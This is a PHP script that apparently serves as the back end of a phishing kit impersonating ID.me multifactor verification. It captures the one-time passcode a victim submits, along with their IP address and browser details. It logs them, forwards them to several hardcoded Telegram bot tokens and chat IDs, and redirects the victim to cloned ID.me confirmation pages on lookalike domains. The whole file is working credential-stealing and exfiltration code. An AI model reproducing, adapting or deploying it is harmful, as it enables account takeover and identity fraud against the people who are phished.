<?php
ob_start();

$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
    ],

    'illuminatigroup.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
        ],
        "redirect" => "https://illuminatigroup.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],

    'illuminatiglobal.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
        ],
        "redirect" => "https://illuminatiglobal.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],

    'illuminatinetwork.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
        ],
        "redirect" => "https://illuminatinetwork.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],

    'illuminaticonnect.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
        ],
        "redirect" => "https://illuminaticonnect.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html"
    ],
];

$log_file = __DIR__ . '/otp_submission_log.txt';

function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed = parse_url($referer);
    $domain = $parsed['host'] ?? 'unknown-origin';
    
    $otp = htmlspecialchars($_POST['userotp'] ?? '???');
    
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $message = "🔐 *ID.me OTP Submission*\n\n" .
               "🔢 *OTP Code:* `$otp`\n" .
               "🌐 *Domain:* $domain\n" .
               "📡 *IP:* `$ip`\n" .
               "🕒 *Time:* $timestamp\n" .
               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
    
    logToFile("[$domain] OTP: $otp | IP: $ip | UA: $user_agent", $log_file);
    
    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($message, $config['bots']);
        
        ob_end_clean();
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        http_response_code(403);
        exit("Unauthorized domain");
    }
}
?>
